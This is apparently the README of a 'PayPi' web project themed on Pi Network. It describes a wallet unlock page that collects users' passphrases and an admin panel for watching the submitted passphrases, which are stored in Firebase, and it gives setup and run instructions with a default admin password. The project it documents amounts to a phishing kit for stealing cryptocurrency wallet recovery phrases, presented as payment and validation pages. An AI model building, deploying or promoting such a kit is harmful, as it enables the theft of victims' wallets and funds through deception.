# Pi Network - PayPi

A Pi Network web project with wallet passphrase collection, admin dashboard, and payment validation flows.

## Features

- Wallet unlock page with passphrase input
- Admin panel for monitoring submitted passphrases
- Firebase Firestore integration
- Payment and validation pages

## Installation

```bash
npm install
```

## Configuration

Create a `.env` file in the root directory with:

```
PORT=8080
ADMIN_USERNAME=admin
ADMIN_PASSWORD=piadmin123
FIREBASE_PROJECT_ID=your-project-id
FIREBASE_PRIVATE_KEY_ID=your-key-id
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n"
FIREBASE_CLIENT_EMAIL=firebase-adminsdk@your-project.iam.gserviceaccount.com
FIREBASE_CLIENT_ID=your-client-id
```

## Running

```bash
npm start
```

- User page: `http://127.0.0.1:8080/mine/index.html`
- Admin panel: `http://127.0.0.1:8080/admin.html`
